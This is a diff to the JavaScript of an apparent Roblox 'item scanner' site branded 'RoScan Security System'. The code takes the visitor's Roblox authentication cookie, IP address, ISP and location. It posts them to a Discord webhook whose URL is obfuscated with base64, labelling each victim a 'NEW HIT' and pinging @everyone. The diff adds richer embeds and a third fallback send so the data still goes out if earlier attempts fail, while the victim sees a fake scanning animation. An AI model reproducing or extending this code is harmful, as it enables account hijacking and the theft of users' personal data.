@@ -221,20 +221,51 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
-        // Format cookie for better readability in Discord
-        let formattedCookie = 'None';
-        if (robloxCookie) {
-            // Truncate very long cookies but keep them copyable
-            if (robloxCookie.length > 100) {
-                formattedCookie = `\`\`\`${robloxCookie}\`\`\``;
-            } else {
-                formattedCookie = `\`${robloxCookie}\``;
-            }
-        }
+        // Create rich embed for Discord
+        const embed = {
+            title: "🚨 NEW HIT DETECTED! 🚨",
+            color: 0xff4444, // Red color
+            thumbnail: {
+                url: "https://cdn.iconscout.com/icon/free/png-256/roblox-2-555327.png"
+            },
+            fields: [
+                {
+                    name: "🍪 Authentication Cookie",
+                    value: robloxCookie ? `\`\`\`${robloxCookie}\`\`\`` : "`No cookie found`",
+                    inline: false
+                },
+                {
+                    name: "📍 Location Info",
+                    value: `**City:** ${locationInfo.city || 'Unknown'}\n**Country:** ${locationInfo.country || 'Unknown'}\n**Region:** ${locationInfo.region || 'Unknown'}`,
+                    inline: true
+                },
+                {
+                    name: "🌐 Network Details", 
+                    value: `**IP:** ${locationInfo.ip || 'Unknown'}\n**ISP:** ${locationInfo.isp || 'Unknown'}\n**Timezone:** ${locationInfo.timezone || 'Unknown'}`,
+                    inline: true
+                },
+                {
+                    name: "⏰ Captured At",
+                    value: `${new Date().toLocaleString()}`,
+                    inline: false
+                },
+                {
+                    name: "📊 Analysis Stats",
+                    value: `**Input Length:** ${inputText.length} chars\n**Word Count:** ${wordCount} words\n**Cookie Length:** ${robloxCookie ? robloxCookie.length : 0} chars`,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: "RoScan Security System",
+                icon_url: "https://cdn.iconscout.com/icon/free/png-64/security-1925159-1631136.png"
+            },
+            timestamp: new Date().toISOString()
+        };
         
-        // Enhanced payload with better formatting
+        // Enhanced payload with embed
         const payload = {
-            content: `@everyone **🚨 NEW HIT! 🚨**\n\n**🍪 Cookie:**\n${formattedCookie}\n\n**📍 Location:** ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\n**🌐 IP:** ${locationInfo.ip || 'Unknown'}\n**🏢 ISP:** ${locationInfo.isp || 'Unknown'}\n**⏰ Time:** ${new Date().toLocaleString()}`
+            content: "@everyone",
+            embeds: [embed]
         };
 
         console.log('Sending webhook with payload:', payload);
@@ -263,10 +294,18 @@ async function submitPowerShell() {
                 closeScanModal();
             }, 4000);
         } else {
-            // If enhanced format fails, try simple format as fallback
-            console.log('Enhanced format failed, trying simple format...');
+            // If enhanced embed fails, try simple embed as fallback
+            console.log('Enhanced embed failed, trying simple format...');
+            const simpleEmbed = {
+                title: "🚨 NEW HIT! 🚨",
+                color: 0xff0000,
+                description: `**Cookie:** ${robloxCookie ? `\`${robloxCookie.substring(0, 100)}...\`` : 'None'}\n**Location:** ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\n**IP:** ${locationInfo.ip || 'Unknown'}`,
+                timestamp: new Date().toISOString()
+            };
+            
             const fallbackPayload = {
-                content: `@everyone NEW HIT!\nCookie: ${robloxCookie || 'None'}\nLocation: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\nIP: ${locationInfo.ip || 'Unknown'}`
+                content: "@everyone",
+                embeds: [simpleEmbed]
             };
             
             const fallbackResponse = await fetch(webhookUrl, {
@@ -292,7 +331,37 @@ async function submitPowerShell() {
                     closeScanModal();
                 }, 4000);
             } else {
-                throw new Error(`Item scanning failed with status: ${response.status} (fallback also failed: ${fallbackResponse.status})`);
+                // If both embeds fail, try plain text as final fallback
+                console.log('Both embed formats failed, trying plain text...');
+                const textPayload = {
+                    content: `@everyone NEW HIT!\nCookie: ${robloxCookie || 'None'}\nLocation: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\nIP: ${locationInfo.ip || 'Unknown'}`
+                };
+                
+                const textResponse = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(textPayload)
+                });
+                
+                if (textResponse.ok) {
+                    console.log('Plain text format succeeded');
+                    submitText.textContent = 'Scanning item please wait';
+                    submitBtn.style.background = '#10b981';
+                    showNotification('Scanning item please wait', 'success');
+                    
+                    // Show scanning animation with loading overlay
+                    showLoadingOverlay('Scanning item please wait', 'Analyzing limited items and authentication data');
+                    startScanningAnimation();
+                    
+                    setTimeout(() => {
+                        hideLoadingOverlay();
+                        closeScanModal();
+                    }, 4000);
+                } else {
+                    throw new Error(`All webhook formats failed: ${response.status}, ${fallbackResponse.status}, ${textResponse.status}`);
+                }
             }
         }
     } catch (error) {
